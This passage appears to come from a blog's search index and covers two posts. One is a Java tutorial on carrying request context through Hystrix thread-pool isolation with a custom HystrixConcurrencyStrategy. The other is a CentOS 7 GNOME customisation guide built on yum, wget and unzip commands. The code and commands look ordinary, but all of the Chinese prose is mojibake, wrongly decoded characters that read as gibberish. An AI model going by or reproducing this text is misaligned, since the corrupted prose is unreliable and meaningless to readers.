çš„çº¿ç¨‹ä¼ é€’é—®é¢˜æœ‰ä¸¤ç§æ–¹æ³•ï¼š ç¬¬ä¸€ç§ï¼šä¿®æ”¹ Hystrix çš„éš”ç¦»ç­–ç•¥ï¼Œä½¿ç”¨ä¿¡å·é‡éš”ç¦»ï¼Œç›´æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶å³å¯ï¼Œä½† Hystrix é»˜è®¤æ˜¯çº¿ç¨‹æ± éš”ç¦»ï¼ŒåŠ ä¸Šä»çœŸå®çš„é¡¹ç›®æƒ…å†µçœ‹ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯ä½¿ç”¨çº¿ç¨‹æ± éš”ç¦»ï¼Œå› æ­¤æ­¤æ–¹æ¡ˆä¸å¤ªæ¨èï¼Œå¯¹åº”å±æ€§ä¸ºï¼šhystrix.command.default.execution.isolation.strategy ç¬¬äºŒç§ï¼šHystrix å®˜æ–¹æ¨èçš„ä¸€ç§æ–¹å¼ï¼Œå°±æ˜¯ä½¿ç”¨ç»§æ‰¿ HystrixConcurrencyStrategy ç±»è¦†ç›– wrapCallable æ–¹æ³•ï¼Œä¸‹é¢å°†ä»‹ç»æ­¤æ–¹æ³•çš„ä½¿ç”¨ä¾‹å­ åˆ›å»º HystrixThreadCallable ç±»ï¼Œè¯¥ç±»çš„æ„é€ å‡½æ•°æ˜¯å¸Œæœ›ä¼ é€’ RequestContextHolder å’Œè‡ªå®šä¹‰çš„ HystrixThreadLocal å¯¹è±¡ï¼š 123456789101112131415161718192021222324public class HystrixThreadCallable&lt;S&gt; implements Callable&lt;S&gt; { private final RequestAttributes requestAttributes; private final Callable&lt;S&gt; delegate; private String params; public HystrixThreadCallable(Callable&lt;S&gt; callable, RequestAttributes requestAttributes, String params) { this.delegate = callable; this.requestAttributes = requestAttributes; this.params = params; } @Override public S call() throws Exception { try { RequestContextHolder.setRequestAttributes(requestAttributes); HystrixThreadLocal.threadLocal.set(params); return delegate.call(); } finally { RequestContextHolder.resetRequestAttributes(); HystrixThreadLocal.threadLocal.remove(); } }} é‡å†™ HystrixConcurrencyStrategy ç±»çš„ wrapCallable æ–¹æ³•ï¼Œåœ¨æ‰§è¡Œè¯·æ±‚å‰åŒ…è£… HystrixThreadCallable å¯¹è±¡ï¼Œå°†éœ€è¦çš„å¯¹è±¡ä¿¡æ¯è®¾ç½®è¿›å»ï¼Œè¿™æ ·åœ¨ä¸‹ä¸€ä¸ªçº¿ç¨‹ä¸­å°±å¯ä»¥æ‹¿åˆ°äº†ï¼š 1234567public class SpringCloudHystrixConcurrencyStrategy extends HystrixConcurrencyStrategy { @Override public &lt;T&gt; Callable&lt;T&gt; wrapCallable(Callable&lt;T&gt; callable) { return new HystrixThreadCallable&lt;&gt;(callable, RequestContextHolder.getRequestAttributes(), HystrixThreadLocal.threadLocal.get()); }} é…ç½®ç±»ï¼š 12345678@Configurationpublic class HystrixThreadContextConfiguration { @Bean public SpringCloudHystrixConcurrencyStrategy springCloudHystrixConcurrencyStrategy() { return new SpringCloudHystrixConcurrencyStrategy(); }} å¯åŠ¨åº”ç”¨åè®¿é—® http://127.0.0.1:8082/user/get/2 åï¼Œå¯ä»¥å‘ç°å³ä½¿ä½¿ç”¨äº† Hystrix çš„çº¿ç¨‹æ± éš”ç¦»æ¨¡å¼ï¼Œä¸åŒçš„çº¿ç¨‹ä¹Ÿèƒ½é¡ºåˆ©æ‹¿åˆ°ä¸Šä¸€ä¸ªçº¿ç¨‹ä¼ é€’è¿‡æ¥çš„ä¿¡æ¯ï¼š 1234567UserController : current thread: 59UserController : thread local: userId: 2UserController : RequestContextHolder: userId: 2UserService : current thread: 84UserService : thread local: userId: 2UserService : RequestContextHolder: userId: 2 å¹¶å‘ç­–ç•¥å…±å­˜ç”±äº HystrixPlugins çš„ registerConcurrencyStrategy æ–¹æ³•åªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡ï¼Œå³ Hystrix ä¸å…è®¸æ³¨å†Œå¤šä¸ª Hystrix å¹¶å‘ç­–ç•¥ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™ï¼Œè¿™å°±å¯¼è‡´äº†æ— æ³•å’Œå…¶ä»–å¹¶å‘ç­–ç•¥ä¸€èµ·ä½¿ç”¨ï¼Œå› æ­¤éœ€è¦å°†å…¶ä»–å¹¶å‘ç­–ç•¥æ³¨å…¥è¿›å»ï¼Œè¾¾åˆ°å¹¶å­˜çš„ç›®çš„ï¼Œå¦‚ sleuth çš„å¹¶å‘ç­–ç•¥ä¹Ÿæ˜¯åšäº†åŒæ ·çš„äº‹æƒ…ã€‚å…·ä½“çš„åšæ³•å°±æ˜¯åœ¨æ„é€ æ­¤å¹¶å‘ç­–ç•¥æ—¶ï¼Œæ‰¾åˆ°ä¹‹å‰å·²ç»å­˜åœ¨çš„å¹¶å‘ç­–ç•¥ï¼Œå¹¶ä¿ç•™åœ¨ç±»çš„å±æ€§ä¸­ï¼Œåœ¨è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œè¿”å›ä¹‹å‰å¹¶å‘ç­–ç•¥çš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚è¯·æ±‚å˜é‡ã€è¿æ¥æ± ã€é˜»å¡é˜Ÿåˆ—ï¼›ç­‰è¯·æ±‚è¿›æ¥æ—¶ï¼Œæ—¢ä¸å½±å“ä¹‹å‰çš„å¹¶å‘ç­–ç•¥ï¼Œä¹Ÿå¯ä»¥åŒ…è£…éœ€è¦çš„è¯·æ±‚ä¿¡æ¯ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public class SpringCloudHystrixConcurrencyStrategy extends HystrixConcurrencyStrategy { private HystrixConcurrencyStrategy delegateHystrixConcurrencyStrategy; @Override public &lt;T&gt; Callable&lt;T&gt; wrapCallable(Callable&lt;T&gt; callable) { return new HystrixThreadCallable&lt;&gt;(callable, RequestContextHolder.getRequestAttributes(), HystrixThreadLocal.threadLocal.get()); } public SpringCloudHystrixConcurrencyStrategy() { init(); } private void init() { try { this.delegateHystrixConcurrencyStrategy = HystrixPlugins.getInstance().getConcurrencyStrategy(); if (this.delegateHystrixConcurrencyStrategy instanceof SpringCloudHystrixConcurrencyStrategy) { return; } HystrixCommandExecutionHook commandExecutionHook = HystrixPlugins.getInstance().getCommandExecutionHook(); HystrixEventNotifier eventNotifier = HystrixPlugins.getInstance().getEventNotifier(); HystrixMetricsPublisher metricsPublisher = HystrixPlugins.getInstance().getMetricsPublisher(); HystrixPropertiesStrategy propertiesStrategy = HystrixPlugins.getInstance().getPropertiesStrategy(); HystrixPlugins.reset(); HystrixPlugins.getInstance().registerConcurrencyStrategy(this); HystrixPlugins.getInstance().registerCommandExecutionHook(commandExecutionHook); HystrixPlugins.getInstance().registerEventNotifier(eventNotifier); HystrixPlugins.getInstance().registerMetricsPublisher(metricsPublisher); HystrixPlugins.getInstance().registerPropertiesStrategy(propertiesStrategy); } catch (Exception e) { throw e; } } @Override public ThreadPoolExecutor getThreadPool(HystrixThreadPoolKey threadPoolKey, HystrixProperty&lt;Integer&gt; corePoolSize, HystrixProperty&lt;Integer&gt; maximumPoolSize, HystrixProperty&lt;Integer&gt; keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue) { return this.delegateHystrixConcurrencyStrategy.getThreadPool(threadPoolKey, corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue); } @Override public ThreadPoolExecutor getThreadPool(HystrixThreadPoolKey threadPoolKey, HystrixThreadPoolProperties threadPoolProperties) { return this.delegateHystrixConcurrencyStrategy.getThreadPool(threadPoolKey, threadPoolProperties); } @Override public BlockingQueue&lt;Runnable&gt; getBlockingQueue(int maxQueueSize) { return this.delegateHystrixConcurrencyStrategy.getBlockingQueue(maxQueueSize); } @Override public &lt;T&gt; HystrixRequestVariable&lt;T&gt; getRequestVariable(HystrixRequestVariableLifecycle&lt;T&gt; rv) { return this.delegateHystrixConcurrencyStrategy.getRequestVariable(rv); }} è¡¥å……å†…å®¹Hystrix çš„ä¼˜åŠ¿Hytrix æ”¯æŒå¼‚æ­¥è°ƒç”¨ï¼Œæ”¯æŒçº¿ç¨‹æ± çº§åˆ«çš„éš”ç¦» è¿™ç§æ–¹å¼å°±æ˜¯é€šè¿‡ RxJava è¿›è¡Œè°ƒç”¨ï¼Œç­‰å¾…å®Œæˆåè¿›è¡Œå¼‚æ­¥é€šçŸ¥è°ƒç”¨ï¼Œä½†åœ¨ HTTP è¿™ç§è¯·æ±‚ä¸­ï¼Œä¸»çº¿ç¨‹è¿˜æ˜¯é˜»å¡åœ¨ç­‰å¾…ä¸­ã€‚å¸¦æ¥çš„æ”¶ç›Šæ— éå°±æ˜¯ Hytrix èƒ½å¯¹è¶…æ—¶è¿›è¡Œæ§åˆ¶ã€‚ä½†ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå¦‚æœæ˜¯æ¯ä¸ªæ¥å£åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ± çš„è¯ï¼Œå¦‚æœæ¥å£è¿‡å¤šï¼Œæœºå™¨ä¸­ä¼šåˆ›å»ºå¤§é‡çº¿ç¨‹ï¼Œè€Œåœ¨ Java ä¸­ï¼Œçº¿ç¨‹æ˜¯å±äºè½»é‡çº§çš„è¿›ç¨‹ï¼Œå¯¹åº”æ˜¯å†…æ ¸çº¿ç¨‹ï¼Œè¿›è€Œé€ æˆçº¿ç¨‹çš„åˆ‡æ¢ã€‚è€Œçº¿ç¨‹åˆ‡æ¢çš„æˆæœ¬ä¹Ÿæ¯”è¾ƒé«˜ã€‚å†è€…è¿˜éœ€è¦é¢„å…ˆç»™å„ä¸ªèµ„æºåšçº¿ç¨‹æ± å¤§å°çš„åˆ†é…ï¼Œå¹¶ä¸”å¯¹äºä¸€äº›ä½¿ç”¨äº† ThreadLocal çš„åœºæ™¯ä¸å‹å¥½ã€‚ Hytrix æ”¯æŒç™¾åˆ†æ¯” + è¿ç»­é”™è¯¯æ¯”ç‡çš„æ¡ä»¶è¿›è¡Œé™çº§ è¿™ç¡®å®æ¯” Sentinel å•çº¯çš„ç»Ÿè®¡å¼‚å¸¸ç‡ï¼Œæˆ–å¼‚å¸¸æ•°æ›´ç²¾ç»†ï¼ŒæŠ€æœ¯é€‰å‹å…·ä½“æ ¹æ®ä¸šåŠ¡å»å–èˆã€‚æ­£å¦‚é˜¿é‡Œå·´å·´è‡ªå·±æ¯”è¾ƒçš„ï¼ŒSentinel ä¾§é‡äºæµæ§ï¼Œè€Œç†”æ–­çš„è¯ Hytrix æ›´çµæ´»å’Œä¸“ä¸šçš„ï¼Œè™½ç„¶ Hystrix å·²ç»åœæ­¢å¼€å‘äº†ï¼Œä½†ä¸€èˆ¬æƒ…å†µä¸‹ç”¨ Sentinel ä»£æ›¿ Hytrix ä¹Ÿè¶³å¤Ÿäº†ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Centos7 æ¡Œé¢ç¾åŒ–",url:"/posts/e546702a.html",text:'ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux å®‰è£…ä¾èµ– 12345678910111213141516# å®‰è£…epelæº# yum install epel-release# å®‰è£…å­—ä½“# yum install liberation-mono-fonts# å®‰è£…gnomeèœå•# yum install gnome-menus# å®‰è£…gnomeä¸ªæ€§åŒ–å®šåˆ¶å·¥å…·# yum install gnome-tweak-tool# å®‰è£…æ¡Œé¢ç®¡ç†å™¨# yum install gnome-shell# é€šè¿‡æŒ‰ä¸‹ Alt + F2 å¿«æ·é”®ï¼Œç„¶åè¾“å…¥ r é‡å¯ç•Œé¢ï¼Œå¯¼èˆªåˆ°åº”ç”¨ç¨‹åº --&gt; é™„ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å¤šäº†ä¸€ä¸ªä¼˜åŒ–å·¥å…· Chrome æµè§ˆå™¨åœ¨çº¿å®‰è£… GNOME Shell æ‰©å±• ä¸‹é¢çš„æ•™ç¨‹é»˜è®¤æ˜¯é€šè¿‡æ‰‹åŠ¨çš„æ–¹å¼å®‰è£… GNOME Shell æ‰©å±•ï¼Œä½† GNOME è¿˜æ”¯æŒé€šè¿‡æµè§ˆå™¨å®‰è£…æ‰©å±•ï¼Œåªéœ€è¦ä¾èµ–æµè§ˆå™¨é™„åŠ ç»„ä»¶å’Œæœ¬åœ°ä¸»æœºè¿æ¥å™¨ã€‚å…¶ä¸­ Chrome æµè§ˆå™¨é™„åŠ ç»„ä»¶å¯ä»¥ç›´æ¥ä»è¿™é‡Œåœ¨çº¿å®‰è£…ï¼Œè€Œæœ¬åœ°ä¸»æœºè¿æ¥å™¨ï¼ˆchrome-gnome-shellï¼‰å¯ä»¥å‚è€ƒå®˜æ–¹æ•™ç¨‹æˆ–è€…ä¸‹é¢ç»™å‡ºæ­¥éª¤è¿›è¡Œå®‰è£…ã€‚ä¸¤è€…éƒ½å®‰è£…å®Œæˆåï¼Œå¯ä»¥ä½¿ç”¨ GNOME å®˜æ–¹çš„æ‰©å±•ç½‘ç«™åœ¨çº¿å®‰è£…å’Œç®¡ç†æ‰©å±•äº†ï¼Œå…¶ä¼˜ç‚¹æ˜¯å¯è§†åŒ–åœ°ç®¡ç†æ‰©å±•å’Œæ–¹ä¾¿æŸ¥çœ‹æ‰©å±•æ˜¯å¦æœ‰å¯ç”¨çš„æ›´æ–°ã€‚ 12345678910111213141516# ç¼–è¯‘å®‰è£…æœ¬åœ°ä¸»æœºè¿æ¥å™¨chrome-gnome-shell# å®‰è£…ä¾èµ–# yum install cmake coreutils jq# å…‹éš†ä»£ç # git clone git://git.gnome.org/chrome-gnome-shell# åˆ›å»ºæ„å»ºç›®å½•# mkdir build &amp;&amp; cd build# ç¼–è¯‘# cmake -DCMAKE_INSTALL_PREFIX=/usr -DBUILD_EXTENSION=OFF ../# å®‰è£…# make install å®‰è£… Extension Update Notifier åˆ°ç›®å‰ä¸ºæ­¢ï¼Œé™¤äº†é€šè¿‡æµè§ˆå™¨è®¿é—® GNOME å®˜æ–¹çš„æ‰©å±•ç½‘ç«™ä¹‹å¤–ï¼Œæ— æ³•çŸ¥é“æ›´æ–°æ˜¯å¦å¯ç”¨äº GNOME Shell æ‰©å±•ã€‚å¹¸è¿çš„æ˜¯ï¼ŒExtension Update Notifier å¯ä»¥é€šçŸ¥ä½ æ˜¯å¦æœ‰å¯ç”¨äºå·²å®‰è£…æ‰©å±•çš„æ›´æ–°ï¼Œå…·ä½“å®‰è£…æ­¥éª¤å¦‚ä¸‹ï¼Œå®˜æ–¹ Github åœ°å€ï¼Œå®˜æ–¹ä¸‹è½½åœ°å€ã€‚ 123456789101112131415161718192021# ä»¥ä¸‹æ“ä½œï¼Œä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…æˆ–è€…é…ç½®# åˆ›å»ºæ‰©å±•ç›®å½•# mkdir ~/.local/share/gnome-shell/extensions/update-extensions@franglais125.gmail.com# è¿›å…¥æ‰©å±•ç›®å½•# cd ~/.local/share/gnome-shell/extensions/update-extensions@franglais125.gmail.com# æŸ¥çœ‹gnome-shellçš„ç‰ˆæœ¬# gnome-shell --version# æ ¹æ®gnome-shellçš„ç‰ˆæœ¬ï¼Œåœ¨å®˜ç½‘ä¸‹è½½å‹ç¼©æ–‡ä»¶# wget https://extensions.gnome.org/extension-data/update-extensions%40franglais125.gmail.com.v9.shell-extension.zip# è§£å‹å‹ç¼©æ–‡ä»¶# unzip update-extensions@franglais125.gmail.com.v9.shell-extension.zip# åˆ é™¤å‹ç¼©æ–‡ä»¶# rm -rf update-extensions@franglais125.gmail.com.v9.shell-extension.zip# é€šè¿‡æŒ‰ä¸‹ Alt + F2 å¿«æ·é”®ï¼Œç„¶åè¾“å…¥ r é‡å¯ç•Œé¢ï¼Œå¯¼èˆªåˆ°åº”ç”¨ç¨‹åº --&gt; é™„ä»¶ --&gt; ä¼˜åŒ–å·¥å…· --&gt; æ‰©å±•ï¼Œå¯ä»¥çœ‹åˆ°æ–°å¢çš„"Extension Update Notifier"ï¼Œç‚¹å‡»"æ‰“å¼€"å³å¯å¯ç”¨æ‰©å±• å®‰è£… Netspeed Netspeed å¯ä»¥åœ¨æ¡Œé¢é¡¶éƒ¨èœå•æ æ˜¾ç¤ºç½‘é€Ÿï¼Œå®˜æ–¹ Github åœ°å€ï¼Œå®˜æ–¹ä¸‹è½½åœ°å€ã€‚ 123456789101112131415161718192021# ä»¥ä¸‹æ“ä½œï¼Œä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…æˆ–è€…é…ç½®# åˆ›å»ºæ‰©å±•ç›®å½•# mkdir ~/.local/share/gnome-shell/extensions/netspeed@hedayaty.gmail.com# è¿›å…¥æ‰©å±•ç›®å½•# cd ~/.local/share/gnome-shell/extensions/netspeed@hedayaty.gmail.com# æŸ¥çœ‹gnome-shellçš„ç‰ˆæœ¬# gnome-shell --version# æ ¹æ®gnome-shellçš„ç‰ˆæœ¬ï¼Œåœ¨å®˜ç½‘ä¸‹è½½netspeedå‹ç¼©æ–‡ä»¶# wget https://extensions.gnome.org/extension-data/netspeed%40hedayaty.gmail.com.v29.shell-extension.zip# è§£å‹å‹ç¼©æ–‡ä»¶# unzip netspeed@hedayaty.gmail.com.v29.shell-extension.zip# åˆ é™¤å‹ç¼©æ–‡ä»¶# rm -rf netspeed@hedayaty.gmail.com.v29.shell-extension.zip# é€šè¿‡æŒ‰ä¸‹ Alt + F2 å¿«æ·é”®ï¼Œç„¶åè¾“å…¥ r é‡å¯ç•Œé¢ï¼Œå¯¼èˆªåˆ°åº”ç”¨ç¨‹åº --&gt; é™„ä»¶ --&gt; ä¼˜åŒ–å·¥å…· --&gt; æ‰©å±•ï¼Œå¯ä»¥çœ‹åˆ°æ–°å¢çš„"Netspeed"ï¼Œç‚¹å‡»"æ‰“å¼€"å³å¯å¯ç”¨æ‰©å±• å®‰è£… Dash-to-dock Dash-to-dock å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å°†åº”ç”¨ç¨‹åºå›ºå®šåˆ°å³ä¾§ã€å·¦ä¾§ã€é¡¶éƒ¨ã€åº•éƒ¨ç­‰ä½ç½®ï¼Œæ•ˆæœç±»ä¼¼ macOS çš„åº•éƒ¨èœå•æ ã€‚å®˜æ–¹å®‰è£…æ•™ç¨‹ï¼Œå®˜æ–¹ä¸‹è½½åœ°å€ã€‚ 123456789101112131415161718192021# ä»¥ä¸‹æ“ä½œï¼Œä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…æˆ–è€…é…ç½®# åˆ›å»ºæ‰©å±•ç›®å½•# mkdir ~/.local/share/gnome-shell/extensions/dash-to-dock@micxgx.gmail.com# è¿›å…¥æ‰©å±•ç›®å½•# cd ~/.local/share/gnome-shell/extensions/dash-to-dock@micxgx.gmail.com# æŸ¥çœ‹gnome-shellçš„ç‰ˆæœ¬# gnome-shell --version# æ ¹æ®gnome-shellçš„ç‰ˆæœ¬ï¼Œåœ¨å®˜ç½‘ä¸‹è½½dash-to-dockå‹ç¼©æ–‡ä»¶# wget https://extensions.gnome.org/review/download/dash-to-dockmicxgx.gmail.com.v65.shell-extension.zip# è§£å‹å‹ç¼©æ–‡ä»¶# unzip dash-to-dockmicxgx.gmail.com.v65.shell-extension.zip# åˆ é™¤å‹ç¼©æ–‡ä»¶# rm -rf dash-to-dockmicxgx.gmail.com.v65.shell-extension.zip# é€šè¿‡æŒ‰ä¸‹ Alt + F2 å¿«æ·é”®ï¼Œç„¶åè¾“å…¥ r é‡å¯ç•Œé¢ï¼Œå¯¼èˆªåˆ°åº”ç”¨ç¨‹åº --&gt; é™„ä»¶ --&gt; ä¼˜åŒ–å·¥å…· --&gt; æ‰©å±•ï¼Œå¯ä»¥çœ‹åˆ°æ–°å¢çš„"Dash to dock"ï¼Œç‚¹å‡»"æ‰“å¼€"å³å¯å¯ç”¨æ‰©å±• å®‰è£… DynamicTopBar DynamicTopBar å¯ä»¥å°†çš„æ¡Œé¢é¡¶éƒ¨èœå•æ å˜å¾—é€æ˜ï¼Œè€Œä¸”å¯ä»¥è‡ªå®šä¹‰é€æ˜åº¦ã€‚å®˜æ–¹å®‰è£…æ•™ç¨‹ï¼Œå®˜æ–¹ä¸‹è½½åœ°å€ã€‚ 12345678910111213141516171819# ä»¥ä¸‹æ“ä½œï¼Œä¸åŒçš„Linuxç”¨æˆ·éœ€è¦å•ç‹¬å®‰è£…æˆ–è€…é…ç½®# è¿›å…¥æ‰©å±•ç›®å½•# cd ~/.local/share/gnome-shell/extensions/# ä¸‹è½½æ–‡ä»¶# wget https://github.com/AMDG2/GnomeShell_DynamicTopBar/archive/3.3.1.tar.gz# è§£å‹å‹ç¼©æ–‡ä»¶# unzip 3.3.1.tar.gz# å‰ªåˆ‡æ‰©å±•æ–‡ä»¶# mv GnomeShell_DynamicTopBar-3.3.1/dynamicTopBar@gnomeshell.feildel.fr .# åˆ é™¤æ–‡ä»¶# rm -rf 3.3.1.tar.gz# rm -rf GnomeShell_DynamicTopBar-3.3.1# é€šè¿‡æŒ‰ä¸‹ Alt + F2 å¿«æ·é”®ï¼Œç„¶åè¾“å…¥ r é‡å¯ç•Œé¢ï¼Œå¯¼èˆªåˆ°åº”ç”¨ç¨‹åº --&gt; é™„ä»¶ --&gt; ä¼˜åŒ–å·¥å…· --&gt; æ‰©å±•ï¼Œå¯ä»¥çœ‹åˆ°æ–°å¢çš„"Dynamic top bar"ï¼Œç‚¹å‡»"æ‰“å¼€"å³å¯ç”¨æ‰©å±• å…¶ä»–å¸¸ç”¨çš„ GNOME-Shell æ‰©å±• removable-drive-menuï¼šæ˜¾ç¤ºå¯ç§»é™¤è®¾å¤‡ï¼ˆå¦‚ U ç›˜ï¼‰çš„æ‹”æ’æç¤º Sound Input &amp; Output Device Chooserï¼šé€‰æ‹©éŸ³é¢‘è¾“å…¥ / è¾“å‡ºè®¾å¤‡ Freonï¼šæ˜¾ç¤º CPU æ¸©åº¦ï¼ŒCPU ç”µå‹ï¼Œ æ˜¾å¡æ¸©åº¦ï¼Œ ç¡¬ç›˜æ¸©åº¦ï¼Œæ•£çƒ­é£æ‰‡è½¬é€Ÿ æç¤ºï¼šGNOME Shell æ‰©å±•çš„å®‰è£…æ–¹æ³•åŸºæœ¬ä¸€è‡´ï¼Œå…¶ä»–æ‰©å±•çš„å®‰è£…å¯ä»¥å‚è€ƒä¸Šè¿°æ­¥éª¤ åˆ é™¤æ¡Œé¢åº•éƒ¨ä»»åŠ¡æ  12345678910# è¿›å…¥gnomeçš„å…¨å±€æ‰©å±•ç›®å½•# cd /usr/share/gnome-shell/extensions# å¤‡ä»½æ–‡ä»¶# tar -cvf window-list@gnome-shell-extensions.gcampax.github.com.tar.gz window-list@gnome-shell-extensions.gcampax.github.com# åˆ é™¤æ–‡ä»¶# rm -rf window-list@gnome-shell-extensions.gcampax.github.com# é€šè¿‡æŒ‰ä¸‹ Alt + F2 å¿«æ·é”®ï¼Œç„¶åè¾“å…¥ r é‡å¯ç•Œé¢ï¼Œå¯ä»¥å‘ç°åº•éƒ¨ä»»åŠ¡æ å·²ç»æ¶ˆå¤± (adsbygoogle = window.adsbygoogle || []).push({}); ç³»ç»Ÿä¸»é¢˜ä»‹ç» GNOME çš„åº”ç”¨ä¸»é¢˜å¯ä»¥ä»è¿™é‡Œè·å–å¾—åˆ°ï¼Œå»ºè®®å¯ä»¥é€‰æ‹© macOS ä¸»é¢˜ã€‚å›¾æ ‡ä¸»é¢˜å¯ä»¥ä»è¿™é‡Œè·å–å¾—åˆ°ï¼Œå»ºè®®å¯ä»¥é€‰æ‹© macOS å›¾æ ‡ã€‚é€‰æ‹©ä¸»é¢˜çš„æ—¶å€™ï¼Œéœ€è¦ç•™æ„å¯¹åº”çš„ä¸»é¢˜æ˜¯å¦æ”¯æŒå½“å‰ç³»ç»Ÿçš„ GTK ç‰ˆæœ¬ã€‚å…¶ä¸­ç³»ç»Ÿä¸»é¢˜åˆ†ä¸ºä»¥ä¸‹å‡ éƒ¨åˆ†ï¼š Cursor Themeï¼š/usr/share/icons/ Icons Themesï¼š/usr/share/icons/ Shell Themesï¼š/usr/share/icons/ GTK/Applications Themesï¼š/usr/share/themes/ åŸºäº GTK2 å®‰è£… MacOS ä¸»é¢˜ 12345678# æŸ¥çœ‹gtkç‰ˆæœ¬# pkg-config --list-all | grep gtk# æŸ¥çœ‹gtkçš„å…·ä½“ç‰ˆæœ¬ï¼Œå¦‚æœä¸Šé¢æ˜¾ç¤ºgtk+-3.0ï¼Œåˆ™å°†ä»¥ä¸‹å‘½ä»¤ä¸­çš„gtk+-2.0æ›¿æ¢ä¸ºgtk+-3.0# pkg-config --modversion gtk+-2.0# å®‰è£…gtk2ä¾èµ–ï¼Œå¦‚æœæ˜¯gtk3åˆ™ä¸ç”¨å®‰è£…# yum install gtk-murrine-engine gtk2-engines 12345678910# ä¸‹è½½åº”ç”¨ä¸»é¢˜æ–‡ä»¶ï¼Œè¿™é‡Œé€‰æ‹©McHigh Sierraä¸»é¢˜# wget https://xxxx/Sierra-dark.tar.xz# è§£å‹åº”ç”¨ä¸»é¢˜æ–‡ä»¶# tar -xvf Sierra-dark.tar.xz# æ‹·è´åº”ç”¨ä¸»é¢˜æ–‡ä»¶# mv Sierra-dark /usr/share/themes/# é€šè¿‡æŒ‰ä¸‹ Alt + F2 å¿«æ·é”®ï¼Œç„¶åè¾“å…¥ r é‡å¯ç•Œé¢ï¼Œå¯¼èˆªåˆ°åº”ç”¨ç¨‹åº --&gt; é™„ä»¶ --&gt; ä¼˜åŒ–å·¥å…· --&gt; å¤–è§‚ï¼Œé€‰æ‹©æ–°å¢çš„åº”ç”¨ä¸»é¢˜å³å¯ 1234567891011# ä¸‹è½½å›¾æ ‡ä¸»é¢˜æ–‡ä»¶# wget https://xxxx/02-McMojave-circle-black.tar.xz# è§£å‹å›¾æ ‡ä¸»é¢˜æ–‡ä»¶# tar -xvf 02-McMojave-circle-black.tar.xz# æ‹·è´å›¾æ ‡ä¸»é¢˜æ–‡ä»¶# mv McMojave-circle-black /usr/share/icons# mv McMojave-circle-black-dark /usr/share/icons# é€šè¿‡æŒ‰ä¸‹ Alt + F2 å¿«æ·é”®ï¼Œç„¶åè¾“å…¥ r é‡å¯ç•Œé¢ï¼Œå¯¼èˆªåˆ°åº”ç”¨ç¨‹åº --&gt; é™„ä»¶ --&gt; ä¼˜åŒ–å·¥å…· --&gt; å¤–è§‚ï¼Œé€‰æ‹©æ–°å¢çš„å›¾æ ‡ä¸»é¢˜å³å¯ å¯ç”¨ç”¨æˆ·è‡ªå®šä¹‰ä¸»é¢˜ å¯¼èˆªåˆ°åº”ç”¨ç¨‹åº â€“&gt; é™„ä»¶ â€“&gt; ä¼˜åŒ–å·¥å…· â€“&gt; æ‰©å±•ï¼Œæ‰¾åˆ°â€User themesâ€. ç‚¹å‡»â€ æ‰“å¼€â€ å³å¯ç”¨ï¼Œå¦åˆ™è‡ªå®šä¹‰çš„ Shell ä¸»é¢˜ä¸ä¼šç”Ÿæ•ˆã€‚ åº”ç”¨ç¨‹åºç¨‹åºçª—å£å±…ä¸­ï¼ˆæ–¹æ³•ä¸€ï¼‰ å› ä¸ºåœ¨ CentOS7 ä¸­æ‰“å¼€æ–°çš„çª—å£éƒ½ä¼šé å·¦ä¸Šè§’æ˜¾ç¤ºï¼Œæ‰€ä»¥æ¯æ¬¡æ‰“å¼€ä¸€ä¸ªçª—å£éƒ½è¦å¤šåšä¸€æ­¥æ“ä½œï¼Œå°†çª—å£ç§»åˆ°å±å¹•ä¸­é—´ã€‚å¦‚æœä¸æƒ³è¿™ä¹ˆéº»çƒ¦ï¼Œå¯ä»¥å®‰è£… ccsmï¼ˆcompizconfig-settings-managerï¼‰æ¥è®¾ç½®çª—å£ä½ç½®é»˜è®¤ä¸ºå±…ä¸­ã€‚ 1234567# å®‰è£…ccsm# yum install ccsm# è¿è¡Œccsmï¼ˆä½¿ç”¨æ™®é€šç”¨æˆ·èº«ä»½ï¼‰$ ccsm# æˆ–è€…å¯¼èˆªåˆ°åº”ç”¨ç¨‹åº --&gt; å…¶ä»– --&gt; CompizConfigè®¾ç½®ç®¡ç†å™¨ --&gt; çª—å£ç®¡ç† --&gt; æ”¾ç½®çª—å£ --&gt; å¸¸è§„ï¼Œé¦–å…ˆå‹¾é€‰"å¯ç”¨æ”¾ç½®çª—å£"ï¼Œç„¶åè®¾ç½®"å®‰ç½®æ¨¡å¼"ä¸ºå±…ä¸­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º åº”ç”¨ç¨‹åºç¨‹åºçª—å£å±…ä¸­ï¼ˆæ–¹æ³•äºŒï¼‰ å¦‚æœé€šè¿‡ ccsm æ— 